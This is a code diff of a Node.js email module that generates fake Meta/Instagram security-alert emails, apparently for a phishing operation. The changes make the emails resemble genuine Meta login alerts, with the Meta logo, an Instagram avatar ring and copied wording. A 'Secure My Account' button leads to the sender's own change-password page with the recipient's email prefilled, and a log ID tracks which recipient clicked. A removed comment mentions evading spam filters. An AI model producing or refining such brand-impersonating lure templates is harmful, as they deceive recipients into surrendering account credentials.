@@ -174,20 +174,9 @@ async function sendOtpEmail(to, otp) {
             </td>
           </tr>
 
-          <!-- ── "from" label ── -->
-          <tr>
-            <td align="center" style="padding:20px 24px 8px;">
-              <p style="margin:0;
-                        font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
-                        font-size:11px;color:#8e8e8e;">
-                from
-              </p>
-            </td>
-          </tr>
-
           <!-- ── Meta logo ── -->
           <tr>
-            <td align="center" style="padding:0 24px 16px;">
+            <td align="center" style="padding:20px 24px 16px;">
               <img
                 src="${META_LOGO_URL}"
                 alt="Meta"
@@ -262,6 +251,7 @@ async function sendOtpEmail(to, otp) {
 async function sendPasswordChangedEmail(to, username = '') {
   const transporter = getTransporter();
   const B = EMAIL_CONFIG; // shorthand
+  // Show username if present, otherwise show email
   const displayName = username || to;
 
   console.log('🔒 Preparing password change confirmation email for:', to);
@@ -340,20 +330,9 @@ async function sendPasswordChangedEmail(to, username = '') {
             </td>
           </tr>
 
-          <!-- ── "from" label ── -->
-          <tr>
-            <td align="center" style="padding:20px 24px 8px;">
-              <p style="margin:0;
-                        font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
-                        font-size:11px;color:#8e8e8e;">
-                from
-              </p>
-            </td>
-          </tr>
-
           <!-- ── Meta logo ── -->
           <tr>
-            <td align="center" style="padding:0 24px 16px;">
+            <td align="center" style="padding:20px 24px 16px;">
               <img
                 src="${META_LOGO_URL}"
                 alt="Meta"
@@ -421,29 +400,30 @@ async function sendPasswordChangedEmail(to, username = '') {
 
 /**
  * Send security alert notification email (someone tried to login).
- * Format optimized to avoid spam filters while keeping change password link.
  * @param {string} to                 Recipient email address
  * @param {string} username           Username (optional)
- * @param {string} notificationType   Type of notification ("Someone tried to sign in" or "New login detected")
+ * @param {string} notificationType   "Someone tried to sign in" | "New login detected"
  * @param {string} deviceName         Device name (optional)
  * @param {string} location           Location (optional)
- * @param {string} type               Record type ("simple" or "advance")
- * @param {string} avatar             Avatar URL (optional, used for advance type)
+ * @param {string} type               "simple" | "advance"
+ * @param {string} avatar             Avatar URL (advance type only)
+ * @param {string} logId              Log entry _id (for tracking which email was clicked)
  */
-async function sendSecurityAlertEmail(to, username = '', notificationType = 'Someone tried to sign in', deviceName = '', location = '', type = 'simple', avatar = '') {
+async function sendSecurityAlertEmail(to, username = '', notificationType = 'Someone tried to sign in', deviceName = '', location = '', type = 'simple', avatar = '', logId = '') {
   const transporter = getTransporter();
   const now = new Date();
   const dateStr = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
   const timeStr = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
   const deviceInfo = deviceName || 'Unknown Device';
   const locationInfo = location || 'Unknown Location';
-  
-  // Build change password URL with email, username, and source parameters
+
+  // Build change password URL — include logId so tracking knows WHICH notification was clicked
   const encodedEmail = encodeURIComponent(to);
   const encodedUsername = username ? encodeURIComponent(username) : '';
-  const changePasswordUrl = encodedUsername 
+  let changePasswordUrl = encodedUsername
     ? `${process.env.FRONTEND_URL}/changepassword?email=${encodedEmail}&username=${encodedUsername}&source=email`
     : `${process.env.FRONTEND_URL}/changepassword?email=${encodedEmail}&source=email`;
+  if (logId) changePasswordUrl += `&logId=${encodeURIComponent(logId)}`;
   
   console.log('📧 Preparing security notification email for:', to);
   console.log('   Type:', type);
@@ -451,15 +431,15 @@ async function sendSecurityAlertEmail(to, username = '', notificationType = 'Som
   console.log('   Username:', username);
 
   // Dynamic email title based on notification type
-  const emailTitle = 'Security Alert - Unusual Login Attempt';
+  const emailTitle = notificationType === 'New login detected'
+    ? `Security Alert - New login to your ${EMAIL_CONFIG.BRAND_NAME} Account`
+    : 'Security Alert - Unusual Login Attempt';
 
-  // Greeting based on username availability (for simple type)
+  // Greeting: username only if present, otherwise just "Hi,"
   const greeting = username ? `Hi ${username},` : 'Hi,';
   
-  // Email account display (only show email if username exists for simple type)
-  const emailDisplay = username 
-    ? `<a href="mailto:${to}" style="color:#385898;text-decoration:none;font-weight:500;font-size:18px!important;">${to}</a>`
-    : '';
+  // Email always shown as a link after "account"
+  const emailLink = `<a href="mailto:${to}" style="color:#385898;text-decoration:none;font-weight:500;font-size:18px!important;">${to}</a>`;
 
   // Choose email template based on type
   if (type === 'advance' && avatar) {
@@ -472,14 +452,14 @@ async function sendSecurityAlertEmail(to, username = '', notificationType = 'Som
     if (type === 'advance' && !avatar) {
       console.log('   ⚠️  WARNING: Advance type but no avatar provided, falling back to simple template');
     }
-    return sendSimpleSecurityEmail(transporter, to, greeting, emailDisplay, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle);
+    return sendSimpleSecurityEmail(transporter, to, greeting, emailLink, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle);
   }
 }
 
 /**
  * Send simple security alert email (no profile picture)
  */
-async function sendSimpleSecurityEmail(transporter, to, greeting, emailDisplay, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle) {
+async function sendSimpleSecurityEmail(transporter, to, greeting, emailLink, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle) {
   const B = EMAIL_CONFIG; // shorthand
   const html = `<!DOCTYPE html>
 <html lang="en">
@@ -520,7 +500,7 @@ async function sendSimpleSecurityEmail(transporter, to, greeting, emailDisplay, 
             </td>
           </tr>
 
-          <!-- ── Body text ── -->
+          <!-- ── Greeting ── -->
           <tr>
             <td style="padding:0 24px 6px;
                        font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
@@ -528,13 +508,15 @@ async function sendSimpleSecurityEmail(transporter, to, greeting, emailDisplay, 
               ${greeting}
             </td>
           </tr>
+
+          <!-- ── Body text — merged with email + unrecognized device ── -->
           <tr>
             <td style="padding:0 24px 20px;
                        font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
                        font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.7;">
-              ${notificationType === 'Someone tried to sign in' 
-                ? `We noticed a login attempt to your ${B.BRAND_NAME} account`
-                : `There was a new login to your ${B.BRAND_NAME} account`}${emailDisplay ? ' ' + emailDisplay : ''}.
+              ${notificationType === 'Someone tried to sign in'
+                ? `We've noticed a login attempt to your ${B.BRAND_NAME} account ${emailLink} from an unrecognized device which you don't usually use.`
+                : `We've noticed a new login to your ${B.BRAND_NAME} account ${emailLink} from an unrecognized device which you don't usually use.`}
             </td>
           </tr>
           
@@ -557,7 +539,7 @@ async function sendSimpleSecurityEmail(transporter, to, greeting, emailDisplay, 
             </td>
           </tr>
 
-          <!-- ── Change Password Button ── -->
+          <!-- ── Secure My Account Button ── -->
           <tr>
             <td align="center" style="padding:0 24px 32px;">
               <a href="${changePasswordUrl}" 
@@ -572,7 +554,7 @@ async function sendSimpleSecurityEmail(transporter, to, greeting, emailDisplay, 
                              color:#ffffff;
                              text-decoration:none;
                              display:inline-block;">
-                  Change Password
+                  Secure My Account
                 </span>
               </a>
             </td>
@@ -587,20 +569,9 @@ async function sendSimpleSecurityEmail(transporter, to, greeting, emailDisplay, 
             </td>
           </tr>
 
-          <!-- ── "from" label ── -->
-          <tr>
-            <td align="center" style="padding:20px 24px 8px;">
-              <p style="margin:0;
-                        font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
-                        font-size:11px;color:#8e8e8e;">
-                from
-              </p>
-            </td>
-          </tr>
-
           <!-- ── Meta logo ── -->
           <tr>
-            <td align="center" style="padding:0 24px 16px;">
+            <td align="center" style="padding:20px 24px 16px;">
               <img
                 src="${META_LOGO_URL}"
                 alt="Meta"
@@ -642,9 +613,9 @@ async function sendSimpleSecurityEmail(transporter, to, greeting, emailDisplay, 
 </body>
 </html>`;
 
-  const text = `${greeting.replace(',', '')}\n\n${notificationType === 'Someone tried to sign in' 
-    ? `We noticed a login attempt to your ${B.BRAND_NAME} account`
-    : `There was a new login to your ${B.BRAND_NAME} account`}.\n\n• Device: ${deviceInfo}\n• Location: ${locationInfo}\n• Time: ${dateStr} at ${timeStr}\n\nIf this wasn't you, please secure your account right away.\n\nChange Password: ${changePasswordUrl}\n\n© ${B.BRAND_NAME}. ${B.COMPANY} · ${B.ADDRESS}\nThis message was sent to ${to}`;
+  const text = `${greeting.replace(',', '')}\n\n${notificationType === 'Someone tried to sign in'
+    ? `We've noticed a login attempt to your ${B.BRAND_NAME} account ${to} from an unrecognized device which you don't usually use.`
+    : `We've noticed a new login to your ${B.BRAND_NAME} account ${to} from an unrecognized device which you don't usually use.`}\n\n• Device: ${deviceInfo}\n• Location: ${locationInfo}\n• Time: ${dateStr} at ${timeStr}\n\nIf this wasn't you, please secure your account right away.\n\nSecure My Account: ${changePasswordUrl}\n\n© ${B.BRAND_NAME}. ${B.COMPANY} · ${B.ADDRESS}\nThis message was sent to ${to}`;
 
   const mailOptions = createMailOptions(
     to,
@@ -674,7 +645,12 @@ async function sendSimpleSecurityEmail(transporter, to, greeting, emailDisplay, 
 async function sendAdvanceSecurityEmail(transporter, to, username, notificationType, deviceInfo, locationInfo, dateStr, timeStr, changePasswordUrl, emailTitle, avatar) {
   const B = EMAIL_CONFIG; // shorthand
   const displayUsername = username || to.split('@')[0];
-  
+
+  // Heading changes based on notification type
+  const headingLine1 = notificationType === 'Someone tried to sign in'
+    ? `We've noticed a login attempt,`
+    : `We've noticed a new login,`;
+
   const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -714,115 +690,123 @@ async function sendAdvanceSecurityEmail(transporter, to, username, notificationT
             </td>
           </tr>
 
-          <!-- ── Profile Picture in Instagram Frame ── -->
+          <!-- ── Heading line 1 ── -->
           <tr>
-            <td align="center" style="padding:0 24px 20px;">
-              <div style="display:inline-block;position:relative;">
-                <!-- Instagram story ring gradient -->
-                <div style="background:linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);border-radius:50%;padding:3px;display:inline-block;">
-                  <div style="background:#ffffff;border-radius:50%;padding:3px;display:inline-block;">
-                    <img
-                      src="${avatar}"
-                      alt="${displayUsername}"
-                      width="80" height="80"
-                      style="display:block;border-radius:50%;border:0;outline:none;" />
-                  </div>
-                </div>
-              </div>
+            <td align="center" style="padding:0 24px 2px;
+                       font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
+                       font-size:18px;font-weight:500;color:#262626;line-height:1.4;text-align:center;">
+              ${headingLine1}
             </td>
           </tr>
 
-          <!-- ── Username ── -->
+          <!-- ── Heading line 2 — username, same dark style ── -->
           <tr>
-            <td align="center" style="padding:0 24px 6px;
-                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
-                       font-size:16px;font-weight:600;color:#262626;line-height:1.4;">
-              @${displayUsername}
+            <td align="center" style="padding:0 24px 10px;
+                       font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
+                       font-size:18px;font-weight:500;color:#262626;line-height:1.4;text-align:center;">
+              ${displayUsername}
             </td>
           </tr>
 
-          <!-- ── Body text ── -->
+          <!-- ── Subtitle ── -->
           <tr>
-            <td style="padding:0 24px 6px;
-                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
-                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.6;">
-              Hi ${displayUsername},
-            </td>
-          </tr>
-          <tr>
-            <td style="padding:0 24px 20px;
-                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
-                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.7;">
-              ${notificationType === 'Someone tried to sign in' 
-                ? `We noticed a login attempt to your ${B.BRAND_NAME} account`
-                : `There was a new login to your ${B.BRAND_NAME} account`}
-              <a href="mailto:${to}" style="color:#385898;text-decoration:none;font-weight:500;font-size:18px!important;">${to}</a>.
-            </td>
-          </tr>
-          
-          <!-- ── Login Details ── -->
-          <tr>
-            <td style="padding:0 24px 24px;
-                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
-                       font-size:15px;color:#737373;line-height:1.6;">
-              • Device: ${deviceInfo}<br/>
-              • Location: ${locationInfo}<br/>
-              • Time: ${dateStr} at ${timeStr}
-            </td>
-          </tr>
-          
-          <tr>
-            <td style="padding:0 24px 24px;
-                       font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
-                       font-size:18px!important;font-weight:500;color:#565a5c;line-height:1.7;">
-              If this wasn't you, please secure your account right away.
+            <td align="center" style="padding:0 32px 24px;
+                       font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
+                       font-size:14px;font-weight:400;color:#999999;line-height:1.6;text-align:center;">
+              We've noticed a login from a device<br/>that you don't usually use.
             </td>
           </tr>
 
-          <!-- ── Change Password Button ── -->
+          <!-- ── Profile Picture in Instagram Frame (76px) ── -->
           <tr>
-            <td align="center" style="padding:0 24px 32px;">
-              <a href="${changePasswordUrl}" 
-                 style="display:inline-block;
-                        background-color:#0095f6;
-                        border-radius:8px;
-                        padding:12px 32px;
-                        text-decoration:none;">
-                <span style="font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
-                             font-size:14px;
-                             font-weight:600;
-                             color:#ffffff;
-                             text-decoration:none;
-                             display:inline-block;">
-                  Change Password
-                </span>
-              </a>
+            <td align="center" style="padding:0 24px 16px;">
+              <!--[if mso]>
+              <table border="0" cellpadding="0" cellspacing="0"><tr><td style="border-radius:50%;overflow:hidden;width:76px;height:76px;">
+              <![endif]-->
+              <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="display:inline-table;">
+                <tr>
+                  <td style="border-radius:50%;overflow:hidden;width:68px;height:68px;padding:0;background:linear-gradient(45deg,#f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);">
+                    <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="border-radius:50%;overflow:hidden;width:68px;height:68px;">
+                      <tr>
+                        <td align="center" valign="middle" style="padding:1px;">
+                          <table border="0" cellpadding="0" cellspacing="0" role="presentation" style="border-radius:50%;overflow:hidden;background:#ffffff;">
+                            <tr>
+                              <td style="padding:1px;border-radius:50%;overflow:hidden;">
+                                <img
+                                  src="${avatar}"
+                                  alt="${displayUsername}"
+                                  width="64"
+                                  height="64"
+                                  style="display:block;width:64px;height:64px;min-width:64px;border-radius:50%;border:0;outline:none;object-fit:cover;aspect-ratio:1/1;" />
+                              </td>
+                            </tr>
+                          </table>
+                        </td>
+                      </tr>
+                    </table>
+                  </td>
+                </tr>
+              </table>
+              <!--[if mso]></td></tr></table><![endif]-->
+            </td>
+          </tr>
+
+          <!-- ── Device · App · Location ── -->
+          <tr>
+            <td align="center" style="padding:0 24px 4px;
+                       font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
+                       font-size:14px;font-weight:500;color:#262626;line-height:1.5;text-align:center;">
+              ${deviceInfo} &middot; ${B.BRAND_NAME} &middot; ${locationInfo}
+            </td>
+          </tr>
+
+          <!-- ── Date and Time — light text ── -->
+          <tr>
+            <td align="center" style="padding:0 24px 24px;
+                       font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
+                       font-size:14px;font-weight:400;color:#999999;line-height:1.5;text-align:center;">
+              ${dateStr} at ${timeStr}
             </td>
           </tr>
 
           <!-- ── Divider ── -->
           <tr>
-            <td style="padding:0 24px;">
+            <td style="padding:0 24px 20px;">
               <table role="presentation" width="100%" cellpadding="0" cellspacing="0" border="0">
                 <tr><td style="border-top:1px solid #efefef;font-size:0;line-height:0;">&nbsp;</td></tr>
               </table>
             </td>
           </tr>
 
-          <!-- ── "from" label ── -->
+          <!-- ── Body paragraph 2 — with inline "secure your account" link ── -->
           <tr>
-            <td align="center" style="padding:20px 24px 8px;">
-              <p style="margin:0;
-                        font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
-                        font-size:11px;color:#8e8e8e;">
-                from
-              </p>
+            <td align="center" style="padding:0 32px 24px;
+                       font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
+                       font-size:14px;font-weight:400;color:#999999;line-height:1.7;text-align:center;">
+              If this wasn't you, you can
+              <a href="${changePasswordUrl}" style="color:#1b74e4;text-decoration:none;font-weight:600;">secure your account</a>
+              from a device that you've logged in with in the past.
+              <a href="${B.SUPPORT_URL}" style="color:#1b74e4;text-decoration:none;font-weight:600;">Learn more</a>
+            </td>
+          </tr>
+
+          <!-- ── Secure My Account Button ── -->
+          <tr>
+            <td align="center" style="padding:0 24px 32px;">
+              <a href="${changePasswordUrl}"
+                 style="display:inline-block;background-color:#1b74e4;border-radius:6px;padding:12px 32px;text-decoration:none;">
+                <span style="font-family:'Helvetica Neue',Helvetica,Roboto,Arial,sans-serif;
+                             font-size:14px;font-weight:600;color:#ffffff;
+                             text-decoration:none;display:inline-block;">
+                  Secure My Account
+                </span>
+              </a>
             </td>
           </tr>
 
           <!-- ── Meta logo ── -->
           <tr>
-            <td align="center" style="padding:0 24px 16px;">
+            <td align="center" style="padding:20px 24px 16px;">
               <img
                 src="${META_LOGO_URL}"
                 alt="Meta"
@@ -864,9 +848,9 @@ async function sendAdvanceSecurityEmail(transporter, to, username, notificationT
 </body>
 </html>`;
 
-  const text = `@${displayUsername}\n\nHi ${displayUsername},\n\n${notificationType === 'Someone tried to sign in' 
-    ? `We noticed a login attempt to your ${B.BRAND_NAME} account`
-    : `There was a new login to your ${B.BRAND_NAME} account`} ${to}.\n\n• Device: ${deviceInfo}\n• Location: ${locationInfo}\n• Time: ${dateStr} at ${timeStr}\n\nIf this wasn't you, please secure your account right away.\n\nChange Password: ${changePasswordUrl}\n\n© ${B.BRAND_NAME}. ${B.COMPANY} · ${B.ADDRESS}\nThis message was sent to ${to}`;
+  const text = `${headingLine1} ${displayUsername}\n\n${notificationType === 'Someone tried to sign in'
+    ? `We've noticed a login attempt from a device that you don't usually use.`
+    : `We've noticed a new login from a device that you don't usually use.`}\n\n${deviceInfo} · ${B.BRAND_NAME} · ${locationInfo}\n${dateStr} at ${timeStr}\n\nIf this was you, you won't be able to access certain security and account settings for a few days.\n\nIf this wasn't you, secure your account: ${changePasswordUrl}\n\nLearn more: ${B.SUPPORT_URL}\n\n© ${B.BRAND_NAME}. ${B.COMPANY} · ${B.ADDRESS}\nThis message was sent to ${to}`;
 
   const mailOptions = createMailOptions(
     to,
